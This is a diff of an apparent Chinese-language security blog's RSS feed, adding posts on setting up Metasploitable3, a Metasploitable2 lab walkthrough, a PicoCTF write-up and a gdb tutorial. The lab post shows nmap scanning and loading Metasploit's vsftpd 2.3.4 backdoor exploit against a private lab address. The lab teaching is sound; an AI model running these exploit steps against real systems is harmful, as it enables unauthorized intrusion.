+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>mkdir &lt;span style="color:#8be9fd;font-style:italic">metasploitable3-workspace&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">cd metasploitable3-workspace&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">Invoke-WebRequest&lt;/span> -Uri &lt;span style="color:#f1fa8c">&amp;#34;https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile&amp;#34;&lt;/span> -OutFile &lt;span style="color:#f1fa8c">&amp;#34;Vagrantfile&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vagrant up --provider=vmware_desktop
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>等待一段時間，完成後可以在&lt;/p>
+&lt;p>&lt;code>C:\Users\{username}\.vagrant.d\boxes\xxx\yyy\vmware_desktop\&lt;/code> 下看到 box 檔案。&lt;/p>
+&lt;p>將 vmware_desktop 資料夾複製到適當的地方，接著打開 VMWare，在 Library 下按右鍵點選 Scan for Virtual Machines，選擇剛剛複製的資料夾，就可以使用 Metasploitable3 了。&lt;/p></description></item><item><title>【資訊安全】Metasploitable2 滲透測試實作(筆記)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</link><pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</guid><description>&lt;h2 id="先備知識">先備知識&lt;/h2>
 &lt;ul>
 &lt;li>知道如何使用 VMware 或 VirtualBox&lt;/li>
 &lt;li>Kali Linux 基本操作&lt;/li>
@@ -1561,7 +2748,34 @@ combine the AI and CTI applications.&lt;/p>
 &lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 &lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
 &lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF-WriteUp】PicoCTF-file-run2</title><link>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</guid><description>&lt;p>題目：&lt;/p>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; nmap -sV 192.168.235.130
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable2/kali_linux_msf_nmap.png" alt="nmap">&lt;/p>
+&lt;p>可以看到有一大堆 port 是開著的&lt;/p>
+&lt;h2 id="滲透">滲透&lt;/h2>
+&lt;ol>
+&lt;li>看看 vsftpd 有沒有洞，在 msf 中輸入 &lt;code>search vsftpd&lt;/code>，可以看到有一個 exploit 可以使用&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable2/kali_linux_msf_vsftpd.png" alt="search vsftpd">&lt;/p>
+&lt;ol start="2">
+&lt;li>使用這個 exploit，用 &lt;code>show options&lt;/code> 可以看到這個 exploit 需要的參數，然後用 &lt;code>set 參數 值&lt;/code> 設定一些參數。&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#ff79c6">(&lt;/span>unix/ftp/vsftpd_234_backdoor&lt;span style="color:#ff79c6">)&lt;/span> &amp;gt; show options
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#ff79c6">(&lt;/span>unix/ftp/vsftpd_234_backdoor&lt;span style="color:#ff79c6">)&lt;/span> &amp;gt; &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> RHOSTS 192.168.235.130
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable2/kali_linux_msf_exploit.png" alt="use exploit">&lt;/p></description></item><item><title>【CTF-WriteUp】PicoCTF-file-run2</title><link>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</guid><description>&lt;p>題目：&lt;/p>
 &lt;pre>&lt;code>給你一個檔案，執行它時輸入&amp;quot;Hello!&amp;quot;(不含引號)。
 &lt;/code>&lt;/pre>
 &lt;h1 id="概念">概念：&lt;/h1>
@@ -1592,7 +2806,29 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>gdb 除錯工具學習</title><link>https://ja-errorpro.codes/posts/2022/gdb/</link><pubDate>Mon, 26 Sep 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/gdb/</guid><description>&lt;h1 id="what-is-gdb">What is GDB?&lt;/h1>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main(&lt;span style="color:#8be9fd">int&lt;/span> param_1,&lt;span style="color:#8be9fd">long&lt;/span> param_2){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">int&lt;/span> var1;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> ((param_1 &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> &lt;span style="color:#bd93f9">2&lt;/span>) &lt;span style="color:#ff79c6">||&lt;/span> (&lt;span style="color:#bd93f9">2&lt;/span> &lt;span style="color:#ff79c6">&amp;lt;&lt;/span> param_1)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f1fa8c">&amp;#34;Run this file with only one argument.&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> var1 &lt;span style="color:#ff79c6">=&lt;/span> strcmp(&lt;span style="color:#ff79c6">*&lt;/span>(&lt;span style="color:#8be9fd">char&lt;/span> &lt;span style="color:#ff79c6">**&lt;/span>)(param_2 &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#bd93f9">8&lt;/span>),&lt;span style="color:#f1fa8c">&amp;#34;Hello!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (var1 &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#f1fa8c">&amp;#34;The flag is: %s&amp;#34;&lt;/span>,flag);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f1fa8c">&amp;#34;Won&lt;/span>&lt;span style="color:#f1fa8c">\&amp;#39;&lt;/span>&lt;span style="color:#f1fa8c">t you say &lt;/span>&lt;span style="color:#f1fa8c">\&amp;#39;&lt;/span>&lt;span style="color:#f1fa8c">Hello!&lt;/span>&lt;span style="color:#f1fa8c">\&amp;#39;&lt;/span>&lt;span style="color:#f1fa8c"> to me first?&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然而在執行時卻出現權限不足的訊息。&lt;/p></description></item><item><title>gdb 除錯工具學習</title><link>https://ja-errorpro.codes/posts/2022/gdb/</link><pubDate>Mon, 26 Sep 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/gdb/</guid><description>&lt;h1 id="what-is-gdb">What is GDB?&lt;/h1>
 &lt;p>gdb全名為gnu debugger，是一種動態Debug的工具。&lt;/p>
 &lt;h1 id="使用">使用&lt;/h1>
 &lt;p>我們可以先寫一個簡易的Hello World，並宣告一些變數&lt;/p>
@@ -1616,7 +2852,101 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#f1fa8c">&amp;#34;Hello World&lt;/span>&lt;span style="color:#f1fa8c">\n&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF-WriteUp】EasyCTF-adder</title><link>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</guid><description>&lt;p>題目：&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>記得在編譯時加上參數 &lt;code>-g&lt;/code>，否則gdb將提示找不到除錯符，加了只差在程式大小會變大。&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cmd" data-lang="cmd">&lt;span style="display:flex;">&lt;span>$ gcc -g hello.c -o hello 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ gdb ./hello
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h1 id="指令">指令&lt;/h1>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: left">指令&lt;/th>
+ &lt;th style="text-align: left">簡寫&lt;/th>
+ &lt;th style="text-align: left">簡述&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: left">help&lt;/td>
+ &lt;td style="text-align: left">h&lt;/td>
+ &lt;td style="text-align: left">查看指令說明&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">list&lt;/td>
+ &lt;td style="text-align: left">l&lt;/td>
+ &lt;td style="text-align: left">印出程式碼&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">file&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">開啟檔案&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">run&lt;/td>
+ &lt;td style="text-align: left">r&lt;/td>
+ &lt;td style="text-align: left">執行程式&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">kill&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">停止程式&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">breakpoint&lt;/td>
+ &lt;td style="text-align: left">b, bre, break&lt;/td>
+ &lt;td style="text-align: left">設定斷點 &lt;code>ex: b 15&lt;/code>表示執行到第15行&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">continue&lt;/td>
+ &lt;td style="text-align: left">c, cont&lt;/td>
+ &lt;td style="text-align: left">繼續執行&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">next&lt;/td>
+ &lt;td style="text-align: left">n&lt;/td>
+ &lt;td style="text-align: left">步過(遇到呼叫函式會將該函式當成一條指令執行)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">step&lt;/td>
+ &lt;td style="text-align: left">s&lt;/td>
+ &lt;td style="text-align: left">步入(遇到呼叫函式會進入函式一步一步執行)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">print&lt;/td>
+ &lt;td style="text-align: left">p&lt;/td>
+ &lt;td style="text-align: left">印出變數的值 &lt;code>ex: p num&lt;/code>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">display&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">每次步過/入後印出變數值 &lt;code>ex: display num&lt;/code>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">info&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">查看特定資訊 &lt;code>ex: info break&lt;/code>查看設了哪些斷點，不輸入參數可查詢指令&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">quit&lt;/td>
+ &lt;td style="text-align: left">q&lt;/td>
+ &lt;td style="text-align: left">離開gdb，或按Ctrl+C&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&amp;lt;Click&amp;gt; Enter&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">執行上一條指令&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table></description></item><item><title>【CTF-WriteUp】EasyCTF-adder</title><link>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</guid><description>&lt;p>題目：&lt;/p>
 &lt;pre>&lt;code>給你一個加法程式，找出Flag
 &lt;/code>&lt;/pre>
 &lt;p>&lt;a href="https://ja-errorpro.codes/file/adder">adder&lt;/a>&lt;/p>
